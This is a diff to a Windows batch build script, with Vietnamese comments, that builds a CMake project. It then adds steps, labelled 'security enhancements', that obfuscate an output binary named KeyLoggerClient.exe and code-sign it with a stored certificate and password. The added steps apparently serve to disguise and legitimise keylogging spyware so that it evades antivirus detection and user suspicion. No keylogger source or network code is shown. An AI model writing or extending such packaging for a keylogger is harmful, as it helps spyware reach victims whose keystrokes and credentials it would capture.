@@ -13,6 +13,14 @@ set CMAKE_ZIP=cmake-%CMAKE_VERSION%-windows-x86_64.zip
 set CMAKE_URL=https://github.com/Kitware/CMake/releases/download/v%CMAKE_VERSION%/%CMAKE_ZIP%
 set CMAKE_DIR=%TOOLS_DIR%\cmake-%CMAKE_VERSION%-windows-x86_64
 
+:: Security tools config
+set OBFUSCATOR=%TOOLS_DIR%\obfuscator.exe
+set SIGNTOOL=%ProgramFiles(x86)%\Windows Kits\10\bin\x64\signtool.exe
+set CERT_FILE=%TOOLS_DIR%\code_signing.pfx
+set CERT_PASSWORD=YourPasswordHere
+set INPUT_FILE=%DIST_DIR%\KeyLoggerClient.exe
+set OUTPUT_FILE=%DIST_DIR%\KeyLoggerClient_protected.exe
+
 :: ================================
 :: Tạo thư mục cần thiết
 :: ================================
@@ -78,13 +86,50 @@ if %errorlevel% neq 0 (
 
 echo [INFO] Building project...
 cmake --build . --config Release --target ALL_BUILD -j 8
-
 if %errorlevel% neq 0 (
     echo [ERROR] Build failed
     exit /b 1
 )
 
-echo [SUCCESS] Build completed! Executable is in: %DIST_DIR%
-dir "%DIST_DIR%"
+:: ================================
+:: Add additional security steps
+:: ================================
+echo [INFO] Applying security enhancements...
+
+:: Obfuscate the binary
+if exist "%OBFUSCATOR%" (
+    "%OBFUSCATOR%" "%INPUT_FILE%" "%OUTPUT_FILE%"
+    if !errorlevel! equ 0 (
+        echo [INFO] Binary obfuscation completed
+    ) else (
+        echo [WARNING] Obfuscation failed, using original binary
+        copy "%INPUT_FILE%" "%OUTPUT_FILE%"
+    )
+) else (
+    echo [WARNING] Obfuscator not found, skipping obfuscation
+    copy "%INPUT_FILE%" "%OUTPUT_FILE%"
+)
+
+:: Add digital signature
+if exist "%SIGNTOOL%" (
+    "%SIGNTOOL%" sign /f "%CERT_FILE%" /p "%CERT_PASSWORD%" "%OUTPUT_FILE%"
+    if !errorlevel! equ 0 (
+        echo [INFO] Binary signed successfully
+    ) else (
+        echo [WARNING] Code signing failed
+    )
+) else (
+    echo [WARNING] SignTool not found, skipping code signing
+)
+
+:: Verify final binary
+if exist "%OUTPUT_FILE%" (
+    echo [SUCCESS] Final binary created: %OUTPUT_FILE%
+    dir "%OUTPUT_FILE%"
+) else (
+    echo [ERROR] Final binary was not created
+    exit /b 1
+)
 
 endlocal
+exit /b 0
